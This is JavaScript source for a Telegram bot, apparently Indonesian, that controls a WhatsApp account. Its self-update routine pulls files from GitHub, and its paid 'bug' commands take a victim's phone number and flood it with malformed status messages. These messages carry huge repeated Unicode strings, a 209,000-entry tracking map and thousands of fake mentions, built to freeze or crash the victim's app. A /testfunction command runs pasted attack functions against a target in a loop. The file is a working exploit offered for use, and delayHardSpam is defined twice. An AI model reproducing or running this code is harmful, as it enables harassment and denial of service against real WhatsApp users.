  const url = `https://api.github.com/repos/${Owner}/${Repo}/contents/${dir}?ref=${Branch}`;
  const res = await axios.get(url);

  let files = [];

  for (const item of res.data) {
    if (item.type === "file") {
      files.push(item);
    } else if (item.type === "dir") {
      const sub = await getRepoFiles(item.path);
      files = files.concat(sub);
    }
  }

  return files;
}

async function checkGithubUpdate(bot) {
  try {
    const res = await axios.get(GITHUB_API);
    const latestSha = res.data.sha;

    if (!lastCommitSha) {
      lastCommitSha = latestSha;
      return;
    }

    if (latestSha !== lastCommitSha) {
      lastCommitSha = latestSha;

      const message = `
🚀 UPDATE TERBARU TELAH TIBA!

📦 Repo sudah di update
⚡ Ketik /update untuk update terbaru
      `;

      for (let owner of OWNER_IDS) {
        await bot.telegram.sendMessage(owner, message);
      }

      console.log("✅ Update terdeteksi & notif terkirim");
    }
  } catch (err) {
    console.log("❌ Gagal cek update:", err.message);
  }
}

async function downloadFile(file) {
  const localPath = path.join(__dirname, file.path);
  const dir = path.dirname(localPath);

  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }

  const existed = fs.existsSync(localPath);

  const response = await axios({
    url: file.download_url,
    method: "GET",
    responseType: "stream",
  });

  const writer = fs.createWriteStream(localPath);
  response.data.pipe(writer);

  await new Promise((resolve, reject) => {
    writer.on("finish", resolve);
    writer.on("error", reject);
  });

  return existed ? "updated" : "new";
}

bot.command("update", checkOwner, async (ctx) => {
  try {
    await ctx.reply("🔄 Mengambil file dari GitHub...");

    const files = await getRepoFiles();

    const updated = [];
    const added = [];

    for (const file of files) {
      const result = await downloadFile(file);

      if (result === "updated") updated.push(file.path);
      if (result === "new") added.push(file.path);
    }

    let msg = "✅ Update selesai!\n\n";

    if (updated.length) {
      msg += "📥 File diperbarui\n";
      msg += updated.map(v => `• \`${v}\``).join("\n") + "\n\n";
    }

    if (added.length) {
      msg += "🆕 File baru\n";
      msg += added.map(v => `• \`${v}\``).join("\n");
    }

    await ctx.reply(msg, { parse_mode: "Markdown" });

    await ctx.reply("♻️ Bot restart...");

    setTimeout(() => process.exit(0), 3000);

  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Update gagal: " + err.message);
  }
});
//========CASE BUG ANDROID======//
bot.command("drxdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drxdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: drxdelay
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await delayHardSpam(target);
    await delayHardSpam(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: drxdelay
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("drxblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drxfc 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: drxfc
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await delayHardSpam(target);
    await delayHardSpam(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: drxfc
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

//========CASE BUG IOS======//

//==CASE BUG/TOOLS BUG/TOOLS GROUP==//
bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: bugurlpp },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: bugurlpp },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)



//FUNC AMPAS LO TARO DISINI
async function delayHardSpam(target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    let parse = true;

    for (let i = 0; i < 15; i++) {
        await sock.relayMessage("status@broadcast", {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " @TheWolKerz ",
                            format: 1
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: JSON.stringify({
                                status: "{ length: 2000 },",
                                title: "𑇂𑆵𑆴𑆿".repeat(60000)
                            }),
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: "null@broadcast",
                            urlTrackingMap: {
                                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                                    participant: `62${z + 720599}@s.whatsapp.net`
                                }))
                            },
                            placeholder: Math.random().toString(36) + "\u0000"
                        }
                    }
                }
            }
        }, 
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    }
}

async function delayHard(target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    for (let i = 0; i < 20; i++) {
        await sock.relayMessage(
            "status@broadcast",
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: " @TheWolKerz ",
                                format: 1
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: JSON.stringify({
                                    status: "ok",
                                    title: "𑇂𑆵𑆴𑆿".repeat(60000) 
                                }),
                                version: 3
                            },
                            contextInfo: {
                                mentionedJid: mentionedList
                            }
                        }
                    }
                }
            },
            {
                statusJidList: [target]
            }
        );
    }
}

// delay hard invis no tag sw //
async function delayHardSpam(target) {
    let parse = true;

    for (let i = 0; i < 95; i++) {
        await sock.relayMessage("status@broadcast", {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " @TheWolKerz ",
                            format: 1
                        },
                        nativeFlowResponseMessage: {
                            name: "book_confirmation",
                            paramsJson: JSON.stringify({
                                status: "ok",
                                title: "𑇂𑆵𑆴𑆿".repeat(5000),
                                subtitle: " ".repeat(2000),
                                bookingInfo: "{".repeat(10000),
                                date: "WidsEverly" + "ោ៝".repeat(10000),
                                time: "WidsEverly" + "ោ៝".repeat(10000),
                                address: "WidsEverly" + "ꦾ".repeat(40000),
                                price: "WidsEverly" + "ꦾ".repeat(40000)
                            }),
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            placeholder: Math.random().toString(36)
                        }
                    }
                }
            }
        }, 
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    }
}

//


bot.launch()
